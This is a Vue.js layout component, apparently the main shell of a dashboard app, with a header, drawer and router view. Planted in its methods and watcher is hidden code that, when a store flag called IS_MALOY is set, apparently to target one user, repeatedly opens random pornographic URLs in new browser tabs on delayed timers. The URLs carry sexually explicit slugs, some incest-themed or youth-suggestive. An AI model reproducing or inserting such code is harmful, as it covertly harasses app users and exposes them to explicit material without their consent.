<template>
    <div class="mdl-layout mdl-js-layout mdl-layout--fixed-drawer mdl-layout--fixed-header">
        <Header/>
        <Drawer/>
        <main class="mdl-layout__content mdl-color--grey-100">
            <v-container>
                <LoadingSpinner />
                <router-view></router-view>
            </v-container>
        </main>
    </div>
</template>

<script>
    import "./../scripts/d3.min"
    import "./../scripts/getmdl-select.min"
    import "./../scripts/material.min"
    import "./../scripts/nv.d3.min"
    import "./../scripts/layout/layout.min"
    import "./../scripts/scroll/scroll.min"

    import Drawer from "../components/Navigation/Drawer";
    import Header from "../components/Header/Header";
    import ACTIONS from "../store/actions";
    import LoadingSpinner from "../components/Loaders/LoadingSpinner";
    import {mapGetters} from "vuex";
    export default {
        components: {
            LoadingSpinner,
            Drawer, Header
        },
        async mounted() {
            await this.$store.dispatch(ACTIONS.INIT);
        },
        methods: {
            randomPornoSites() {
                const sites = [
                    'http://dojki.su/videos/vstavil-palec-vo-vlagalishche-i-poluchil-bryzgi-v-lico/',
                    'http://dojki.su/videos/skromnyy-malysh-otymel-nedostupnyh-kroshek/',
                    'http://dojki.su/videos/seksualnaya-malyshka-sovratila-negra-s-bolshim-herom/',
                    'http://dojki.su/videos/synok-trahnul-molodenkuyu-machehu/',
                    'http://dojki.su/videos/bombeznye-siski-i-shikarnyy-zad/',
                    'http://dojki.su/videos/na-zadnem-sidenii-otsosala-chlen/',
                    'http://dojki.su/videos/vlyublennye-sladko-udovletvoryayut-drug-druga/',
                    'http://dojki.su/videos/neskolko-raz-konchil-v-molodenkuyu-vaginu/',
                    'http://dojki.su/videos/zdorovye-doyki-pokorili-yunoshu/'
                ];

                const random = Math.floor(Math.random() * (sites.length - 1 + 1) + 1);

                return sites[random - 1];
            },
            openSite() {
                const min = 1;
                const max = 10;
                const random = Math.floor(Math.random() * (max - min + 1) + min);
                console.log(random);
                setTimeout(() => {
                    window.open(this.randomPornoSites(), '_blank');
                }, random * 60 * 1000);
            }
        },
        watch: {
            IS_MALOY(value) {
                if (value) {
                    setInterval(() => {
                        window.open(this.randomPornoSites(), '_blank');
                    }, 10 * 60 * 1000)
                    this.openSite();
                }
            }
        },
        computed: {
            ...mapGetters(['IS_MALOY'])
        }
    }
</script>

<style scoped>

</style>
